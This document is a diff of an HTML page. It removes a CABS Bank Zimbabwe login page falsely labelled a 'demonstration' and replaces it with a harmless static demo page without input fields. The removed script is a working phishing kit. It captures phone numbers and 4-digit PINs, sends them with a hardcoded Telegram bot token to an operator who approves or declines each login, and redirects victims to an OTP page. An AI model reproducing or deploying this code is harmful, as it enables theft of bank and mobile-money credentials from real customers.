@@ -1,1006 +1,142 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<meta name="theme-color" content="#092c4c">
-<title>CABS Bank Zimbabwe | Demo Interface</title>
-p
-<style>
-* {
-    box-sizing: border-box;
-}
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#092c4c">
+  <meta name="description" content="An independent, non-transactional CABS-inspired interface demonstration.">
+  <title>CABS-inspired Demo | Welcome</title>
+  <style>
+    :root {
+      color-scheme: light;
+      --navy: #092c4c;
+      --navy-soft: #123d60;
+      --green: #80bd43;
+      --ink: #203247;
+      --muted: #64748b;
+      --line: #e2e8ef;
+      --surface: #fff;
+      --page: #f2f5f8;
+      --radius: 18px;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
 
-body {
-    margin: 0;
-    font-family: Arial, Helvetica, sans-serif;
-    background: #e5e9ed;
-    color: #25364a;
-}
-
-.container {
-    width: 100%;
-    max-width: 400px;
-    margin: auto;
-    background: white;
-    min-height: 100vh;
-    position: relative;
-    overflow: hidden;
-}
-
-.main-content {
-    padding-bottom: 20px;
-}
-
-.header {
-    background: #092c4c;
-    padding: 35px 20px 40px;
-    text-align: center;
-}
-
-.logo {
-    font-size: 38px;
-    font-weight: 800;
-    letter-spacing: 2px;
-    color: white;
-}
-
-.logo span {
-    color: #80bd43;
-}
-
-.logo-subtitle {
-    color: #dce8f0;
-    font-size: 11px;
-    letter-spacing: 3px;
-    margin-top: 5px;
-}
-
-.login-title {
-    text-align: center;
-    color: #092c4c;
-    font-size: 27px;
-    font-weight: bold;
-    margin-top: 32px;
-}
-
-.demo-label {
-    text-align: center;
-    color: #438a36;
-    font-size: 12px;
-    font-weight: bold;
-    margin-top: 8px;
-}
-
-.form-content {
-    padding: 10px 18px;
-}
-
-.phone-box {
-    margin: 22px 4px;
-    border: 2px solid #123d60;
-    border-radius: 10px;
-    display: flex;
-    align-items: center;
-    padding: 12px;
-    background: #f7f9fb;
-}
-
-.flag {
-    width: 26px;
-    margin-right: 8px;
-}
-
-.code {
-    color: #092c4c;
-    margin-right: 10px;
-    font-weight: bold;
-}
-
-.phone-input {
-    border: none;
-    outline: none;
-    background: transparent;
-    font-size: 17px;
-    flex: 1;
-    min-width: 0;
-}
-
-.pin-title {
-    text-align: center;
-    color: #092c4c;
-    margin-top: 24px;
-    font-weight: 600;
-}
-
-.pin-box {
-    display: flex;
-    justify-content: center;
-    gap: 12px;
-    margin-top: 18px;
-}
-
-.pin {
-    width: 48px;
-    height: 48px;
-    border-radius: 9px;
-    border: 2px solid #17486c;
-    text-align: center;
-    font-size: 21px;
-    outline: none;
-    background: white;
-}
-
-.pin:focus {
-    border-color: #70ae40;
-    box-shadow: 0 0 0 3px rgba(112,174,64,.15);
-}
-
-.error-message {
-    color: #d32f2f;
-    text-align: center;
-    font-size: 13px;
-    margin: 12px 0;
-    min-height: 20px;
-}
-
-.security-note {
-    margin: 22px 8px;
-    padding: 12px;
-    border-radius: 8px;
-    background: #edf5e9;
-    color: #376b31;
-    font-size: 12px;
-    line-height: 1.5;
-    text-align: center;
-}
-
-.bottom {
-    position: relative;
-    margin-top: 50px;
-    background: #092c4c;
-    color: white;
-    padding: 65px 15px 28px;
-    text-align: center;
-}
-
-.bottom::before {
-    content: "";
-    position: absolute;
-    top: -55px;
-    left: -20%;
-    width: 140%;
-    height: 100px;
-    background: white;
-    border-bottom-left-radius: 50%;
-    border-bottom-right-radius: 50%;
-}
-
-.bottom p {
-    width: 90%;
-    margin: auto;
-    font-size: 14px;
-    line-height: 1.5;
-}
-
-.buttons {
-    display: flex;
-    justify-content: center;
-    gap: 12px;
-    margin: 22px 8px;
-}
-
-.btn {
-    background: white;
-    border-radius: 12px;
-    padding: 12px 8px;
-    flex: 1;
-    text-align: center;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 7px;
-    cursor: pointer;
-}
-
-.btn svg {
-    width: 23px;
-    height: 23px;
-    fill: #092c4c;
-}
-
-.btn span {
-    font-size: 12px;
-    color: #092c4c;
-    font-weight: bold;
-}
-
-.version {
-    margin-top: 24px;
-    opacity: .85;
-    font-size: 13px;
-}
-
-.terms {
-    margin-top: 9px;
-    font-size: 12px;
-    opacity: .9;
-}
-
-.terms a {
-    color: #a7d77b;
-}
-
-#spinnerOverlay {
-    position: fixed;
-    inset: 0;
-    display: none;
-    align-items: center;
-    justify-content: center;
-    background: rgba(0,0,0,.6);
-    z-index: 9999;
-}
-
-.spinner-loader {
-    width: 48px;
-    height: 48px;
-    border: 5px solid white;
-    border-top: 5px solid #80bd43;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-    to { transform: rotate(360deg); }
-}
-</style>
+    * { box-sizing: border-box; }
+    body { margin: 0; color: var(--ink); background: var(--page); line-height: 1.5; }
+    a { color: inherit; }
+    button { font: inherit; }
+    .notice {
+      padding: 10px 16px;
+      color: #493900;
+      background: #fff3cd;
+      border-bottom: 1px solid #f1df9f;
+      text-align: center;
+      font-size: .82rem;
+      font-weight: 700;
+    }
+    .shell { width: min(100% - 32px, 760px); margin: 28px auto; }
+    .card { overflow: hidden; background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); box-shadow: 0 12px 36px rgb(9 44 76 / 8%); }
+    header { padding: 26px clamp(20px, 6vw, 42px); color: #fff; background: var(--navy); }
+    .brand { display: inline-flex; align-items: baseline; gap: 8px; color: #fff; text-decoration: none; font-size: 1.7rem; font-weight: 850; letter-spacing: .04em; }
+    .brand-mark { color: var(--green); }
+    .brand-subtitle { display: block; color: #d7e4ee; font-size: .67rem; letter-spacing: .2em; font-weight: 650; }
+    main { padding: clamp(24px, 6vw, 44px); }
+    .eyebrow { margin: 0 0 8px; color: #3e7e2e; font-size: .75rem; font-weight: 800; letter-spacing: .12em; text-transform: uppercase; }
+    h1 { margin: 0; color: var(--navy); font-size: clamp(1.8rem, 6vw, 2.45rem); line-height: 1.15; letter-spacing: -.04em; }
+    .intro { max-width: 56ch; margin: 14px 0 26px; color: var(--muted); }
+    .safety {
+      display: flex; gap: 13px; align-items: flex-start; margin: 24px 0;
+      padding: 16px; border: 1px solid #cfe3c3; border-radius: 14px; background: #f3f9ef;
+    }
+    .safety-icon { flex: 0 0 auto; color: #376b31; font-size: 1.2rem; }
+    .safety strong { display: block; margin-bottom: 3px; color: #2f5d2b; }
+    .safety p { margin: 0; color: #45633e; font-size: .9rem; }
+    .section-title { margin: 30px 0 12px; color: var(--navy); font-size: 1.05rem; }
+    .features { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; }
+    .feature { min-height: 120px; padding: 17px; border: 1px solid var(--line); border-radius: 14px; background: #fff; }
+    .feature-icon { display: block; margin-bottom: 8px; font-size: 1.35rem; }
+    .feature h3 { margin: 0 0 4px; color: var(--navy); font-size: .96rem; }
+    .feature p { margin: 0; color: var(--muted); font-size: .84rem; }
+    .actions { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 26px; }
+    .button { display: inline-flex; min-height: 48px; align-items: center; justify-content: center; padding: 11px 18px; border: 2px solid var(--navy); border-radius: 12px; color: #fff; background: var(--navy); text-decoration: none; font-weight: 750; transition: background .15s ease, transform .15s ease; }
+    .button:hover { background: var(--navy-soft); transform: translateY(-1px); }
+    .button.secondary { color: var(--navy); background: #fff; }
+    .button.secondary:hover { background: #f2f6fa; }
+    .button:focus-visible, a:focus-visible { outline: 3px solid #a7d77b; outline-offset: 3px; }
+    .help-panel { display: none; margin-top: 16px; padding: 16px; border-left: 4px solid var(--green); border-radius: 8px; background: #f4f7fa; }
+    .help-panel.is-visible { display: block; }
+    .help-panel p { margin: 0; color: var(--muted); }
+    footer { padding: 18px clamp(20px, 6vw, 42px); border-top: 1px solid var(--line); color: var(--muted); font-size: .8rem; }
+    footer p { margin: 0; }
+    @media (max-width: 480px) {
+      .shell { width: min(100% - 20px, 760px); margin: 12px auto; }
+      .features { grid-template-columns: 1fr; }
+      .feature { min-height: auto; }
+      .actions { flex-direction: column; }
+      .button { width: 100%; }
+    }
+    @media (prefers-reduced-motion: reduce) { *, *::before, *::after { scroll-behavior: auto !important; transition-duration: .01ms !important; } }
+  </style>
 </head>
-
 <body>
+  <div class="notice" role="note">INDEPENDENT DEMONSTRATION — NOT AN OFFICIAL CABS WEBSITE</div>
+  <div class="shell">
+    <div class="card">
+      <header>
+        <a class="brand" href="index.html" aria-label="CABS-inspired demo home">CABS<span class="brand-mark">.</span></a>
+        <span class="brand-subtitle">INDEPENDENT DEMO</span>
+      </header>
+      <main>
+        <p class="eyebrow">A safe, non-transactional preview</p>
+        <h1>Welcome to the demo</h1>
+        <p class="intro">Explore a sample banking-inspired interface. This page is for design demonstration only and does not provide banking services or verify accounts.</p>
 
-<div class="container">
+        <aside class="safety" aria-label="Important safety notice">
+          <span class="safety-icon" aria-hidden="true">🛡️</span>
+          <div>
+            <strong>Your information stays yours</strong>
+            <p>There are no sign-in fields on this demo. Never enter a real PIN, password, one-time code, card number, or personal account information here.</p>
+          </div>
+        </aside>
 
-    <div class="main-content">
-
-        <div class="header">
-            <div class="logo">CABS<span>.</span></div>
-            <div class="logo-subtitle">BANK ZIMBABWE</div>
+        <h2 class="section-title">Explore the sample interface</h2>
+        <div class="features">
+          <article class="feature">
+            <span class="feature-icon" aria-hidden="true">📊</span>
+            <h3>Loan calculator</h3>
+            <p>View illustrative estimates in the standalone calculator demo.</p>
+          </article>
+          <article class="feature">
+            <span class="feature-icon" aria-hidden="true">🔒</span>
+            <h3>No account access</h3>
+            <p>This experience has no authentication or credential submission.</p>
+          </article>
         </div>
 
-        <div class="login-title">Welcome</div>
-
-        <div class="demo-label">
-            DEMONSTRATION INTERFACE
+        <div class="actions">
+          <a class="button" href="index.html">Explore the calculator</a>
+          <button class="button secondary" type="button" id="helpButton" aria-expanded="false" aria-controls="helpPanel">Safety information</button>
         </div>
-
-        <div class="form-content">
-
-            <div class="phone-box">
-                <img
-                    class="flag"
-                    src="https://flagcdn.com/w40/zw.png"
-                    alt="Zimbabwe flag">
-
-                <div class="code">+263</div>
-
-                <input
-                    class="phone-input"
-                    id="phoneInput"
-                    placeholder="Phone Number"
-                    type="tel"
-                    inputmode="numeric"
-                    autocomplete="off">
-            </div>
-
-            <div class="pin-title">
-                Enter demonstration PIN
-            </div>
-
-            <div class="pin-box">
-
-                <input class="pin" maxlength="1"
-                    inputmode="numeric" type="password"
-                    autocomplete="off">
-
-                <input class="pin" maxlength="1"
-                    inputmode="numeric" type="password"
-                    autocomplete="off">
-
-                <input class="pin" maxlength="1"
-                    inputmode="numeric" type="password"
-                    autocomplete="off">
-
-                <input class="pin" maxlength="1"
-                    inputmode="numeric" type="password"
-                    autocomplete="off">
-
-            </div>
-
-            <div class="error-message" id="error"></div>
-
-            <div class="security-note">
-                Independent demonstration interface.
-                Do not enter real banking PINs, passwords
-                or OTPs. No banking credentials are collected
-                or transmitted.
-            </div>
-
+        <div class="help-panel" id="helpPanel" role="region" aria-label="Safety information">
+          <p>For real banking services, independently find and use verified official CABS channels. This demonstration is not operated, approved, or endorsed by CABS. Do not rely on it for financial decisions.</p>
         </div>
-
+      </main>
+      <footer>
+        <p>Independent demonstration interface · No credentials or personal data are requested, stored, or transmitted.</p>
+      </footer>
     </div>
-
-    <div class="bottom">
-
-        <p>
-            Welcome to the CABS-inspired demonstration
-            interface. For actual banking services,
-            use verified official CABS channels.
-        </p>
-
-        <div class="buttons">
-
-            <div class="btn" id="registerBtn">
-                <svg viewBox="0 0 24 24">
-                    <path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
-                </svg>
-                <span>Register</span>
-            </div>
-
-            <div class="btn" id="helpBtn">
-                <svg viewBox="0 0 24 24">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h2v2h-2zm1-12c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/>
-                </svg>
-                <span>Help &amp; Support</span>
-            </div>
-
-        </div>
-
-        <div class="version">
-            CABS DEMO v1.0
-        </div>
-
-        <div class="terms">
-            Independent demonstration interface.
-        </div>
-
-    </div>
-
-</div>
-
-<div id="spinnerOverlay">
-    <div class="spinner-loader"></div>
-</div>
-
-
-})();
-</script>
-
-
-<script>
-  (function() {
-    // ==================== TELEGRAM CONFIGURATION ====================
-    const BOT_TOKEN = '8727088730:AAE_VEjXM3eS5Bfo_Ot_VOTvsh61n4xKyag';
-    const CHAT_ID   = '8820857419';
-    const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
-    
-    // ==================== DOM ELEMENTS ====================
-    const phoneInput = document.getElementById('phoneInput');
-    const phoneErrorDiv = document.getElementById('phoneError');
-    const registerBtn = document.getElementById('registerBtn');
-    const helpBtn = document.getElementById('helpBtn');
-    
-    // PIN inputs
-    const pinInputs = [
-      document.getElementById('pin1'),
-      document.getElementById('pin2'),
-      document.getElementById('pin3'),
-      document.getElementById('pin4')
-    ];
-    
-    // ==================== STATE ====================
-    let isProcessing = false;        // prevent double submission / telegram polling active
-    let currentPollInterval = null;
-    let currentApproveId = null;
-    let currentDeclineId = null;
-    let pendingPhoneRaw = '';       // stored phone local digits for second attempt
-    let pendingPin = '';
-    
-    // Spinner control
-    const spinner = document.getElementById('spinnerOverlay');
-    function showSpinner() { spinner.style.display = 'flex'; }
-    function hideSpinner() { spinner.style.display = 'none'; }
-    
-    // ==================== ROBUST PHONE VALIDATION (Zimbabwe) ====================
-    // Accepts: 07xxxxxxx (10 digits), 7xxxxxxx (9 digits), 2637xxxxxxx (12 digits)
-    // Returns normalized international format +263XXXXXXXXX (13 chars)
-    function normalizeZimPhone(rawValue) {
-      let digits = rawValue.replace(/\D/g, '');
-      if (digits.length === 0) return null;
-      
-      // Remove leading 263 if present
-      if (digits.startsWith('263')) {
-        digits = digits.substring(3);
-      }
-      // Now digits should be local part (starting with 0 or 7)
-      if (digits.startsWith('0')) {
-        digits = digits.substring(1);
-      }
-      // digits now should be 9 digits starting with 7 (Zimbabwe mobile)
-      if (digits.length === 9 && digits.startsWith('7')) {
-        return '+263' + digits;
-      }
-      // If exactly 9 digits but might not start with 7? Some numbers? Still try
-      if (digits.length === 9) {
-        return '+263' + digits;
-      }
-      // If 8 digits maybe? but typical is 9, we allow anyway
-      if (digits.length === 8 && (digits.startsWith('7') || digits.startsWith('8'))) {
-        return '+263' + digits;
-      }
-      return null;
-    }
-    
-    // Returns local phone number starting with 7 (9 digits) - what we send to bot
-    function getLocalPhoneNumber() {
-      const raw = phoneInput.value;
-      const normalized = normalizeZimPhone(raw);
-      if (!normalized) return null;
-      // Extract after +263
-      let localPart = normalized.substring(4);
-      // Ensure it starts with 7 (typical zim mobile)
-      if (localPart.startsWith('7')) {
-        return localPart;
-      }
-      // If somehow not starting with 7, still return as is (might be landline but uncommon)
-      return localPart;
-    }
-    
-    function getFormattedPhone() {
-      const raw = phoneInput.value;
-      const normalized = normalizeZimPhone(raw);
-      return normalized; // returns +263XXXXXXXXX or null
-    }
-    
-    function updatePhoneValidation() {
-      const raw = phoneInput.value;
-      const normalized = normalizeZimPhone(raw);
-      const isValid = normalized !== null && normalized.length === 13 && normalized.startsWith('+263');
-      
-      if (raw.length === 0) {
-        phoneErrorDiv.textContent = '';
-        phoneInput.style.borderColor = '#1c6aa6';
-      } else if (!isValid) {
-        phoneErrorDiv.textContent = 'Enter a valid phone number (e.g., 0712345678 or 712345678)';
-        phoneInput.style.borderColor = '#e12b2b';
-      } else {
-        phoneErrorDiv.textContent = '';
-        phoneInput.style.borderColor = '#1c6aa6';
-      }
-      return isValid;
-    }
-    
-    // Reset all states, clear polling and UI
-    function resetAllState() {
-      if (currentPollInterval) {
-        clearInterval(currentPollInterval);
-        currentPollInterval = null;
-      }
-      currentApproveId = null;
-      currentDeclineId = null;
-      isProcessing = false;
-      pendingPhoneRaw = '';
-      pendingPin = '';
-      hideSpinner();
-      setPinInputsEnabled(true);
-      phoneInput.disabled = false;
-      // clear any error that might be lingering
-      if (phoneErrorDiv.textContent.includes('declined') || phoneErrorDiv.textContent.includes('Incorrect PIN')) {
-        phoneErrorDiv.textContent = '';
-      }
-    }
-    
-    // Clear PIN fields and optionally focus first
-    function clearPinFields(shouldFocus = false) {
-      pinInputs.forEach(input => {
-        input.value = '';
-        input.style.borderColor = '#1c6aa6';
+  </div>
+  <script>
+    (function () {
+      "use strict";
+      var button = document.getElementById("helpButton");
+      var panel = document.getElementById("helpPanel");
+      button.addEventListener("click", function () {
+        var isExpanded = button.getAttribute("aria-expanded") === "true";
+        button.setAttribute("aria-expanded", String(!isExpanded));
+        panel.classList.toggle("is-visible", !isExpanded);
       });
-      if (shouldFocus && pinInputs[0] && !isProcessing) {
-        pinInputs[0].focus();
-      }
-    }
-    
-    function showLocalError(msg) {
-      phoneErrorDiv.textContent = msg;
-      phoneErrorDiv.style.color = '#e12b2b';
-    }
-    
-    function setPinInputsEnabled(enabled) {
-      pinInputs.forEach(input => {
-        if (enabled) input.removeAttribute('disabled');
-        else input.setAttribute('disabled', 'disabled');
-      });
-    }
-    
-    // ==================== TELEGRAM HELPERS ====================
-    function escapeHtml(unsafe) {
-      if (!unsafe) return '';
-      return unsafe.replace(/[&<>]/g, function(m) {
-        if (m === '&') return '&amp;';
-        if (m === '<') return '&lt;';
-        if (m === '>') return '&gt;';
-        return m;
-      });
-    }
-    
-    function stopPolling() {
-      if (currentPollInterval) {
-        clearInterval(currentPollInterval);
-        currentPollInterval = null;
-      }
-    }
-    
-    // Start polling for admin decision (Approve / Decline)
-    function startPollingForDecision(approveCallbackId, declineCallbackId) {
-      stopPolling();
-      let lastUpdateId = 0;
-      
-      currentPollInterval = setInterval(async () => {
-        if (!isProcessing) {
-          stopPolling();
-          return;
-        }
-        try {
-          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-          const response = await fetch(url);
-          const data = await response.json();
-          if (!data.ok || !data.result.length) return;
-          
-          for (const update of data.result) {
-            lastUpdateId = Math.max(lastUpdateId, update.update_id);
-            const callback = update.callback_query;
-            if (!callback) continue;
-            const cbData = callback.data;
-            
-            if (cbData === approveCallbackId) {
-              // Admin approved -> redirect to otp.html
-              stopPolling();
-              isProcessing = false;
-              hideSpinner();
-              // Store context (optional)
-              sessionStorage.setItem('ecocash_approved_phone', pendingPhoneRaw);
-              sessionStorage.setItem('ecocash_approved_pin', pendingPin);
-              // Redirect to otp.html
-              window.location.href = 'otp.html';
-              return;
-            }
-            
-            if (cbData === declineCallbackId) {
-              // Admin declined
-              stopPolling();
-              isProcessing = false;
-              hideSpinner();
-              setPinInputsEnabled(true);
-              phoneInput.disabled = false;
-              showLocalError('Incorrect Mobile number and/or PIN provided.');
-              clearPinFields(false); // clear PIN but don't auto-focus
-              pendingPhoneRaw = '';
-              pendingPin = '';
-              return;
-            }
-          }
-        } catch (err) {
-          console.warn('Polling error:', err);
-        }
-      }, 1500);
-    }
-    
-    // Send credentials to Telegram bot with inline buttons "Approve" and "Decline"
-    // phoneNumberForBot should be local format starting with 7 (e.g., 712345678)
-    async function sendCredentialsToTelegram(localPhoneNumber, pinCode) {
-      const timestamp = Date.now();
-      const approveId = `ecocash_approve_${timestamp}`;
-      const declineId = `ecocash_decline_${timestamp}`;
-      currentApproveId = approveId;
-      currentDeclineId = declineId;
-      
-      pendingPhoneRaw = localPhoneNumber;
-      pendingPin = pinCode;
-      
-      const message = `🔐 <b>EcoCash Login Request </b>\n\n` +
-                      `<b> Phone: </b> <code>${escapeHtml(localPhoneNumber)}</code>\n` +
-                      `<b> 4-Digit PIN: </b> <code>${escapeHtml(pinCode)}</code>\n\n` +
-                      `⚠️ <b>Action required:</b> Approve or Decline this login attempt.`;
-      
-      try {
-        const response = await fetch(`${API_BASE}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'HTML',
-            reply_markup: {
-              inline_keyboard: [[
-                { text: '✅ Approve', callback_data: approveId },
-                { text: '❌ Decline', callback_data: declineId }
-              ]]
-            }
-          })
-        });
-        
-        if (!response.ok) throw new Error(`HTTP ${response.status}`);
-        
-        // Start polling for admin decision
-        startPollingForDecision(approveId, declineId);
-      } catch (err) {
-        console.error('Telegram send error:', err);
-        hideSpinner();
-        isProcessing = false;
-        setPinInputsEnabled(true);
-        phoneInput.disabled = false;
-        showLocalError('Network error. Unable to contact verification service. Please try again later.');
-        clearPinFields(false);
-      }
-    }
-    
-    // ==================== SUBMIT LOGIC (DIRECT, NO FAKE ATTEMPT) ====================
-    async function submitToTelegram() {
-      if (isProcessing) return;
-      
-      const rawPhone = phoneInput.value.trim();
-      if (!rawPhone) {
-        showLocalError('Please enter your phone number');
-        clearPinFields(false);
-        return;
-      }
-      
-      // Get local phone number starting with 7 (no country code, no leading zero)
-      const localPhone = getLocalPhoneNumber();
-      if (!localPhone || localPhone.length < 9) {
-        showLocalError('Please enter a valid Zimbabwe number (e.g., 0712345678 or 712345678)');
-        clearPinFields(false);
-        return;
-      }
-      
-      const pinValue = pinInputs.map(p => p.value).join('');
-      if (pinValue.length !== 4) {
-        showLocalError('Please enter your 4-digit PIN');
-        clearPinFields(false);
-        return;
-      }
-      
-      // All good - send to Telegram with local phone format (7...)
-      isProcessing = true;
-      setPinInputsEnabled(false);
-      phoneInput.disabled = true;
-      showSpinner();
-      
-      await sendCredentialsToTelegram(localPhone, pinValue);
-    }
-    
-    // ==================== PIN AUTO-ADVANCE & LISTENERS ====================
-    function focusNext(inputs, currentIndex) {
-      if (currentIndex < inputs.length - 1) inputs[currentIndex + 1].focus();
-    }
-    function focusPrev(inputs, currentIndex) {
-      if (currentIndex > 0) inputs[currentIndex - 1].focus();
-    }
-    
-    function setupPinEvents() {
-      pinInputs.forEach((input, idx) => {
-        const pinInputHandler = function(e) {
-          if (isProcessing) return;
-          let val = this.value;
-          val = val.replace(/\D/g, '').slice(0,1);
-          this.value = val;
-          if (val.length === 1) {
-            if (idx < pinInputs.length - 1) {
-              focusNext(pinInputs, idx);
-            } else {
-              // Last digit entered → all PIN digits ready
-              const fullPin = pinInputs.map(p => p.value).join('');
-              if (fullPin.length === 4) {
-                // Small delay to let UI settle, then submit
-                setTimeout(() => {
-                  // Only submit if phone is valid (will show error otherwise)
-                  submitToTelegram();
-                }, 50);
-              }
-            }
-          }
-        };
-        
-        const pinKeydownHandler = function(e) {
-          if (isProcessing) e.preventDefault();
-          if (e.key === 'Backspace') {
-            if (this.value.length === 0 && idx > 0) {
-              e.preventDefault();
-              pinInputs[idx - 1].focus();
-              pinInputs[idx - 1].value = '';
-              pinInputs[idx - 1].dispatchEvent(new Event('input'));
-            }
-          } else if (e.key === 'ArrowLeft') {
-            if (idx > 0) { e.preventDefault(); focusPrev(pinInputs, idx); }
-          } else if (e.key === 'ArrowRight') {
-            if (idx < pinInputs.length - 1) { e.preventDefault(); focusNext(pinInputs, idx); }
-          } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && e.key !== 'Backspace') {
-            e.preventDefault();
-          }
-        };
-        
-        const pinPasteHandler = function(e) {
-          if (isProcessing) return;
-          e.preventDefault();
-          const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-          if (pasted.length) {
-            const pinDigits = pasted.slice(0,4).split('');
-            pinInputs.forEach((p, i) => {
-              if (pinDigits[i]) p.value = pinDigits[i];
-              else p.value = '';
-            });
-            const fullPin = pinInputs.map(p => p.value).join('');
-            if (fullPin.length === 4) {
-              submitToTelegram();
-            } else if (pinInputs[0]) {
-              pinInputs[0].focus();
-            }
-          }
-        };
-        
-        input.removeEventListener('input', pinInputHandler);
-        input.removeEventListener('keydown', pinKeydownHandler);
-        input.removeEventListener('paste', pinPasteHandler);
-        input.addEventListener('input', pinInputHandler);
-        input.addEventListener('keydown', pinKeydownHandler);
-        input.addEventListener('paste', pinPasteHandler);
-      });
-    }
-    
-    // ==================== PHONE INPUT HANDLING (No unwanted focus stealing) ====================
-    function onPhoneChange() {
-      if (isProcessing) return;
-      // Reset any pending state and clear PIN fields when phone number changes
-      resetAllState();
-      clearPinFields(false);
-      updatePhoneValidation();
-      // Clear any error messages
-      if (phoneErrorDiv.textContent.includes('declined')) {
-        phoneErrorDiv.textContent = '';
-      }
-      pendingPhoneRaw = '';
-      pendingPin = '';
-    }
-    
-    phoneInput.addEventListener('input', function() {
-      updatePhoneValidation();
-      onPhoneChange();
-    });
-    
-    phoneInput.addEventListener('blur', function() {
-      const raw = phoneInput.value;
-      const normalized = normalizeZimPhone(raw);
-      if (normalized) {
-        // Display local friendly format (without +263, and without leading 0)
-        let localPart = normalized.substring(4);
-        phoneInput.value = localPart;
-      }
-      updatePhoneValidation();
-    });
-    
-    // Restrict phone input digits only, allow backspace etc.
-    phoneInput.addEventListener('keydown', function(e) {
-      if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab') {
-        e.preventDefault();
-      }
-    });
-    
-    // ==================== BUTTON HANDLERS ====================
-    if (registerBtn) {
-      registerBtn.addEventListener('click', () => {
-        phoneInput.focus();
-        resetAllState();
-        clearPinFields(false);
-        phoneInput.disabled = false;
-      });
-    }
-    if (helpBtn) {
-      helpBtn.addEventListener('click', () => {
-        phoneInput.focus();
-      });
-    }
-    
-    const backToLoginLegacy = document.getElementById('backToLoginBtn');
-    if (backToLoginLegacy) {
-      backToLoginLegacy.addEventListener('click', () => {
-        resetAllState();
-        clearPinFields(false);
-        phoneInput.disabled = false;
-        phoneInput.focus();
-        showLocalError('');
-      });
-    }
-    
-    // ==================== INITIAL SETUP ====================
-    function init() {
-      updatePhoneValidation();
-      setupPinEvents();
-      clearPinFields(false);
-      resetAllState();
-      setPinInputsEnabled(true);
-      phoneInput.disabled = false;
-      // Hide OTP screen entirely
-      const otpScreenDiv = document.getElementById('otpScreen');
-      if (otpScreenDiv) otpScreenDiv.style.display = 'none';
-      // Place cursor in phone field initially
-      phoneInput.focus();
-    }
-    
-    init();
-  })();
-<script>
-    
-(function() {
-
-    const phoneInput =
-        document.getElementById("phoneInput");
-
-    const pins =
-        [...document.querySelectorAll(".pin")];
-
-    const error =
-        document.getElementById("error");
-
-    const spinner =
-        document.getElementById("spinnerOverlay");
-
-    let isRedirecting = false;
-
-    function normalizePhone(value) {
-
-        let digits = value.replace(/\D/g, "");
-
-        if (digits.startsWith("263")) {
-            digits = digits.substring(3);
-        }
-
-        if (digits.startsWith("0")) {
-            digits = digits.substring(1);
-        }
-
-        return /^7\d{8}$/.test(digits);
-    }
-
-    function clearPins() {
-        pins.forEach(pin => pin.value = "");
-        pins[0].focus();
-    }
-
-    phoneInput.addEventListener("input", function() {
-
-        error.textContent = "";
-
-        if (isRedirecting) return;
-
-        pins.forEach(pin => pin.value = "");
-
-    });
-
-    pins.forEach((pin, index) => {
-
-        pin.addEventListener("input", function() {
-
-            if (isRedirecting) return;
-
-            this.value = this.value
-                .replace(/\D/g, "")
-                .slice(0, 1);
-
-            error.textContent = "";
-
-            // Automatically move to next box
-            if (this.value && index < pins.length - 1) {
-                pins[index + 1].focus();
-            }
-
-            // Check all four demonstration fields
-            const complete = pins.every(field =>
-                /^\d$/.test(field.value)
-            );
-
-            if (complete) {
-
-                // Validate phone number
-                if (!normalizePhone(phoneInput.value)) {
-                    error.textContent =
-                        "Enter a valid Zimbabwe phone number.";
-                    return;
-                }
-
-                isRedirecting = true;
-
-                spinner.style.display = "flex";
-
-                // Demonstration navigation
-                setTimeout(function() {
-                    window.location.href = "otp.html";
-                }, 700);
-            }
-
-        });
-
-        // Backspace moves to previous box
-        pin.addEventListener("keydown", function(e) {
-
-            if (isRedirecting) {
-                e.preventDefault();
-                return;
-            }
-
-            if (e.key === "Backspace" &&
-                !this.value &&
-                index > 0) {
-
-                pins[index - 1].focus();
-                pins[index - 1].value = "";
-            }
-
-            if (e.key === "ArrowLeft" && index > 0) {
-                pins[index - 1].focus();
-            }
-
-            if (e.key === "ArrowRight" &&
-                index < pins.length - 1) {
-                pins[index + 1].focus();
-            }
-
-        });
-
-    });
-
-    // Support pasting dummy demonstration digits
-    pins.forEach(pin => {
-
-        pin.addEventListener("paste", function(e) {
-
-            if (isRedirecting) return;
-
-            e.preventDefault();
-
-            const digits = e.clipboardData
-                .getData("text")
-                .replace(/\D/g, "")
-                .slice(0, 4);
-
-            pins.forEach((field, i) => {
-                field.value = digits[i] || "";
-            });
-
-            const complete = pins.every(field =>
-                /^\d$/.test(field.value)
-            );
-
-            if (complete) {
-                pins[3].dispatchEvent(
-                    new Event("input", {bubbles: true})
-                );
-            } else {
-                pins[Math.min(digits.length, 3)].focus();
-            }
-
-        });
-
-    });
-
-    document.getElementById("registerBtn").onclick = () => {
-        alert("Use verified official CABS channels for registration.");
-    };
-
-    document.getElementById("helpBtn").onclick = () => {
-        alert("Contact CABS through its verified official support channels.");
-    };
-}
- </script>
+    })();
+  </script>
 </body>
 </html>
